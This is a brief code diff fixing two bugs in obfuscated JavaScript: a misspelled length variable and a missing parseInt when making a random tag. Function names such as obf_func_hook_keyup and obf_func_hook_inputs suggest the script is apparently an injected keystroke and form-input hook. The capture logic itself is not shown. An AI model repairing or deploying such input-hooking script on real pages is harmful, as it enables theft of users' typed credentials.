@@ -9,7 +9,7 @@
 
 function obf_func_random_string(obf_var_length) {
   var obf_var_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
-      obf_var_buff  = new Array(ob_var_length);
+      obf_var_buff  = new Array(obf_var_length);
   for (obf_var_i = 0; obf_var_i < obf_var_length; obf_var_i++) {
     obf_var_buff[obf_var_i] = obf_var_chars.charAt(parseInt(Math.random() * obf_var_chars.length));
   }
@@ -106,7 +106,7 @@ function obf_func_hook_inputs() {
   });
 }
 
-obf_var_hooked_tag = obf_func_random_string(8 + Math.random() * 8);
+obf_var_hooked_tag = obf_func_random_string(parseInt(8 + Math.random() * 8));
 
 try {
   obf_func_hook_keyup();
